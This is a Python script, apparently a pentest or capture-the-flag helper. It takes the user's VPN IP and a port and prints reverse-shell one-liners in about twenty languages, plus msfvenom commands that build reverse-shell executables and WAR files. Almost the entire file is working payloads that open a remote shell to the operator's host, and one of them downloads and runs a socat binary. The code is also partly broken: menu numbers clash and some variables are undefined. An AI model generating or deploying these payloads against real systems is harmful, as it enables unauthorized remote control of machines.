#!/usr/bin/python3 

import argparse
import os
import sys
import time
import pyperclip

	

parser = argparse.ArgumentParser()

parser.add_argument("-p","--port",type=int,help="give a valid port number")

args=parser.parse_args()

port = str(args.port)
try:
	ip = os.popen("ifconfig tun0").read().split("inet ")[1].split("  netmask")[0]
	ipv6 = os.popen("ifconfig tun0").read().split("inet6 ")[1].split("  prefixlen")[0]

except IndexError as e:
	print("\033[31m[!] Make sure your vpn is connected...")
	sys.exit()

print(("\033[34m        your ip :  "+ip +"   port :"+port))

print("""\033[31m
	\033[31m1]python  		7]xterm			13]java			
	\033[31m2]bash			8]go			14]telnet		
	\033[31m3]netcat		9]lin_sl		15]perl_windows		
	\033[31m4]php			10]ncatssl		16]gawk			
	\033[31m5]powershell		11]win_sl		17]coldfusion		
	\033[31m6]ruby			12]perl 		18]asp 					
	\033[31m14]aspx			21]awk			19]awk
	\033[31m15]jsp			22]war			26]c
	\033[31m16]socat		23]lua			27]ncat
	\033[31m17]golang		24]nodejs		28]war
	\033[31m18]openssl		25]groovy		
	 """)

def progress():
	for i in range(0,50):
		
		code = str(i)
		sys.stdout.write("-")
		sys.stdout.write(u"\u001b[38;5;" + code + "m"+ "-")
		time.sleep(0.01)
		sys.stdout.flush()	
	print(u"\u001b[0m")

choice = input("\033[93mchose your shell number: ")
print("\n")

#red="\\u001b[31m"

bash_tcp = "/bin/bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
bash_tcp_2 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196"
bash_udp = "sh -i >& /dev/udp/"+ip+"/"+port+" 0>&1   listner :  nc -u -lvp"+ip 
socat = """wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"""+ip+"""/"""+port+"""\n  attacker machine    :   socat file:`tty`,raw,echo=0 TCP-L:"""+port
socat_2 = f"""attacker machine : socat file:`tty`,raw,echo=0 TCP-L:{port} 
					victim machine : /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"""
perl_1 = """perl -e 'use Socket;$i=\""""+ip+"""";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
perl_2 = """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\""""+ip+""":"""+port+"""");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
perl_windows = """perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\""""+ip+""":"""+port+"""");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
python_linux = """export RHOST=\""""+ip+"""";export RPORT=\""""+port+"""";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'"""
python_linux_2 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
python_linux_ipv6 = """python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\""""+ipv6+"""","""+port+""",0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'"""
python_linux_ipv6_2 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ipv6+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""	
python_windows = """C:\\Python27\\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect((\'"""+ip+"""\', """+port+""")), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""""
golang = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp",\""""+ip+""":"""+port+"""");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
php_1 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh -i <&3 >&3 2>&3");'"""
php_2 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");shell_exec("/bin/sh -i <&3 >&3 2>&3");'"""
php_3 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");`/bin/sh -i <&3 >&3 2>&3`;'"""
php_4 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");system("/bin/sh -i <&3 >&3 2>&3");'"""
php_5 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");passthru("/bin/sh -i <&3 >&3 2>&3");'"""
php_6 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");popen("/bin/sh -i <&3 >&3 2>&3", "r");'"""
php_7 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
netcat_1 = """nc -e /bin/sh """+ip+""" """+port
netcat_2 = """nc -e /bin/bash """+ip+""" """+port
netcat_3 = """nc -c bash """+ip+""" """+port
netcat_openbsd = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
Netcat_BusyBox = f"""rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"""
ncat_1 = """ncat """+ip+""" """+port+""" -e /bin/bash"""
ncat_2 = """ncat --udp """+ip+""" """+port+""" -e /bin/bash"""
ncatssl = """ncat --ssl -vv -l -p """+port+"""\\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
ruby_1 = """ruby -rsocket -e'f=TCPSocket.open(\""""+ip+"""",\""""+port+"""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
ruby_2 = """ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""""+ip+"""",\""""+port+"""");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"""
ruby_windows = """ruby -rsocket -e 'c=TCPSocket.new(\""""+ip+"""",\""""+port+"""");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"""
powershell1 = """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+ip+"""","""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
powershell2 = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+ip+"""\',"""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
win_sl = """msfvenom -p windows/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f exe > reverse.exe"""
xterm = """xterm -display """+ip+""":"""+port
java = f"""r = Runtime.getRuntime()
					p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
					p.waitFor()"""
java_2 = """String host=\""""+ip+"""\";
				int port="""+port+""";
				String cmd="cmd.exe";
				Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket("""+ip+""","""+port+""");InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())\{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"""
java_3 = """
Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();"""

open_ssl = f"""attacker machine : openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes 
							openssl s_server -quiet -key key.pem -cert cert.pem -port {port}
					OR
							ncat --ssl -vv -l -p {port}
					
					victime machine : mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"""

awk = """awk 'BEGIN {s = "/inet/tcp/0/""""+ip+""""/""""+port+""""; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
war = f"""msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > reverse.war
				strings reverse.war | grep jsp # in order to get the name of the file"""
lua = f"""lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect({ip}, {port}); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"""
lua_linux = f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""""



progress();
new2=int(choice)

if (new2==1):
	print("python linux shell		:	"+python_linux)
	print("\npython linux shell 2		:	"+python_linux_2)
	print("\npython linux shell ipv6		:	"+python_linux_ipv6)
	print("\npython linux shell ipv6	2	:	"+python_linux_ipv6_2)
	print("\npython windows shell 		:	"+python_windows)
elif(new2==2):	
	print("bash tcp  shell 		:	"+bash_tcp)
	print("\nbash tcp 2 shell 		:	"+bash_tcp_2)
	print("\nbash udp shell 			:	"+bash_udp)
elif(new2==3):
	print("netcat   shell 	1		:	"+netcat_1)
	print("\nnetcat   shell 	2		:	"+netcat_2)
	print("\nnetcat   shell 	3		:	"+netcat_3)
	print("\nnetcat   shell 	4		:	"+Netcat_BusyBox)

elif(new2==3):	
	print("netcat openssl  shell 		:	"+netcat_openbsd)
elif(new2==4):	
	print("php   shell 1			:	"+php_1)
	print("\nphp   shell 2			:	"+php_2)
	print("\nphp   shell 3			:	"+php_3)
	print("\nphp   shell 4			:	"+php_4)
	print("\nphp   shell 5			:	"+php_5)
	print("\nphp   shell 6			:	"+php_6)
	print("\nphp   shell 7			:	"+php_7)
elif(new2==5):
	print("powershell   shell 1		:	"+powershell1)
	print("\npowershell   shell 2		:	"+powershell2)
elif(new2==6):
	print("ruby   shell 1			:	"+ruby_1)
	print("\nruby   shell 1			:	"+ruby_2)
	print("\nruby   shell 	windows		:	"+ruby_windows)
elif(new2==12):
	print("perl   shell 1			:	"+perl_1)
	print("\nperl   shell 2			:	"+perl_2)
	print("\nperl  windows shell 		:	"+perl_windows)	
elif(new2==16):
	print("socat   shell 			:	"+socat)
	print("\nsocat   shell 2			:	"+socat_2)
elif(new2==17):
	print("golang   shell 			:	"+golang)
elif(new2==11):
	print("winsl   shell  			:	"+winsl)
elif(new2==7):
	print("xterm   shell 			:	"+xterm)
elif(new2==27):
	print("ncat   shell 1			:	"+ncat_1)
	print("\nncat   shell 1			:	"+ncat_2)
elif(new2==10):
	print("ncatssl   shell 1		:	"+ncat_ssl)
elif(new2==13):
	print("java shell 			:	"+java)
	print("\njava shell 2		:	"+java_2)
	print("\njava shell 3 stealthy	:	"+java_3)


elif(new2==18):
	print("openssl   shell			:	"+open_ssl)
elif(new2==19):	
	print("awk  shell 		:	"+awk)
elif(new2==28):	
	print("war  shell 		:	"+war)
elif(new2==23):	
	print("lua  shell 		:	"+lua)
	print("\nlua  linux 		:	"+lua_linux)
else:
	print("we are upgrading stuffs....please comeback")
	

	pyperclip.copy(ncatssl)

progress();
























